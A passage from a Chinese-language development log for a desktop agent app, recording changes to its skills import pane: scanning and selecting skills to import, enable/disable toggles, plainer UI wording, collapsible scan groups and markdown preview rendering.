  - **Web-server IPC** [apps/web-server/src/server.rs](apps/web-server/src/server.rs)：对应 3 个 dispatch + handler
  - **前端 SkillsPane** [apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx](apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx)：
    - 「从本地目录」按钮 → 选目录 → 调 `scan_skill_dir` → 打开扫描选择 modal（顶部带源信息 + 中间按 relative_path 第一段分组 + 每组「全选/取消」按钮 + 复选框 + 底部确认）
    - 「从 Git 仓库」类似流程，按钮文案改为「扫描仓库」
    - 选中→点确认→调 `import_skills_from_dir` / `import_skills_from_github` 带 `selectedPaths` 真正拷贝
    - 已加载 skills 列表每行最前面加复选框，勾上 = 启用、取消 = 禁用（写入 `~/.hebbian/disabled_skills.json`，立即生效——agent 下次启动不再看到禁用的 skill）；禁用的条目整体 `opacity-50` 灰显
    - SkillItem 类型加 `enabled` 字段

- **影响范围**:
  - agent-core + apps/desktop + apps/web-server + 前端 SkillsPane；`cargo check --workspace` 通过
  - `cargo test -p agent-core --lib` 225 通过（skills 测试更新签名）
  - `pnpm tsc --noEmit` 通过
  - 新数据文件：`~/.hebbian/disabled_skills.json`（不存在时空对象，无需初始化）
  - 行为：导入 UX 由"一键全导"改成"扫描 → 看分组 → 选哪些 → 导入"；启用/禁用立即作用于 agent

- **留尾巴**: 无

### 2026-05-21 — UI 文案纪律入项目 CLAUDE.md；SkillsPane 清掉内部行话；扫描分组可折叠；预览 markdown 自渲染

- **Why**: 用户原话
  1. "在项目的 claude.md 里写，不要在 desktop 写这么多多余的注释比如「按 workdir /Users/ricardo/code/ricardo/rust/hebbian 加载三层来源：global / project / project_code（代码内嵌）」这种，desktop 是给用户看的"——内部架构术语 / 绝对路径 / source 枚举名漏到用户 UI 上很难看也没用
  2. "没有在导入的 skills 下点击展开有哪些 skills，只有一个 SKILLS.md 的就展示一个，有子路径的就要展示子列表，点击展开这种，每个都需要有一个选中框"——扫描结果直接铺开太长，需要单 skill 直接显示、多 skill 分组默认折叠可展开
  3. "然后点击预览也没有渲染成 markdown"——预览框依赖 `prose` 但项目没装 `@tailwindcss/typography`，所有元素退化无样式

- **改动**:
  - **CLAUDE.md 加纪律** [CLAUDE.md](CLAUDE.md)：新增「步骤 3.1：UI 文案纪律」一节，明确禁止在用户能看到的 label/description/toast 里写架构 / 路径 / source 枚举值 / 字段名 / Rust 类型名；给出反例 + 正例 + 自检清单（"我妈看得懂吗"）
  - **SkillsPane 文案重写** [apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx](apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx)：
    - 删除「按 workdir ... 加载三层来源：global / project / project_code（代码内嵌）。点击条目预览 SKILL.md。」→ 改为「点击任一条预览内容；勾选框控制是否启用，禁用后模型不会看到这个 skill。」
    - 「当前对话无 workdir，无法做项目级导入」→「当前对话没绑定项目，先去「目录与工具」选一个项目再来」
    - 「当前对话未设置 workdir，项目级 skill 不可导入。先在「目录与工具」里指定 workdir，或在应用全局设置里管理 skills。」→「当前对话没绑定项目；要装到「当前项目」需要先去「目录与工具」选一个项目，或换到应用全局设置里管理 Skills」
    - 「项目代码内嵌的 skill 请直接修改源文件」→「这条 skill 在你的项目代码里，去源文件改」
    - 「选一个目录：若它自己含 SKILL.md，导入为单个 skill；若它下面有多个含 SKILL.md 的子目录，全部导入。」→「选一个目录，自动扫描里面所有 skill，让你挑哪些导入。」
    - 「浅 clone 到临时目录后拷贝，结束清理。需要本机已装 git。」→「需要本机装了 git。下载下来扫描完，未导入的部分会自动清理。」
    - Tauri dialog title 简化为「选一个目录开始扫描」
  - **扫描结果分组改可折叠** [apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx](apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx)：
    - 新增 `expandedGroups` state（Set<string>），默认空集合（全部折叠）
    - 单 skill 的分组（`items.length === 1`）**直接展示一行**，不需要分组头——符合用户原话"只有一个 SKILL.md 的就展示一个"
    - 多 skill 的分组渲染分组头 = chevron + 三态 checkbox（全选 / 部分选 indeterminate / 全空）+ 「组名 N 个」；点击 chevron 或组名展开子列表，子项缩进 + 各自的勾选框
    - 移除原来的"全选"文字按钮，改用 indeterminate checkbox 更直观
  - **预览 markdown 自渲染** [apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx](apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx)：
    - 删掉对 `prose prose-sm` 的依赖（项目没装 `@tailwindcss/typography` 所以一直没生效，h1/p/ul 跟纯文本一样）
    - 用 ReactMarkdown 的 `components` prop 给 h1-h4 / p / ul / ol / li / code / pre / blockquote / a / hr / table / th / td 全套自定义 className，跟 MessageBubble 同款"普通文本"风格但带间距 + 字号 + 列表缩进
    - 容器加 `max-w-3xl mx-auto` 居中，避免在 1120px 大屏 modal 里满屏拉伸

- **影响范围**:
  - CLAUDE.md（agent 流程纪律）+ SkillsPane.tsx（前端单文件）
  - `pnpm tsc --noEmit` 通过；不动后端
  - 行为：UI 文案换人话；扫描结果只有 1 个 skill 时一行展示，多 skill 用分组折叠减少视觉噪音；点 skill 行打开的预览框正确渲染 markdown（标题 / 列表 / 代码块 / 表格都有样式）

- **留尾巴**: 无
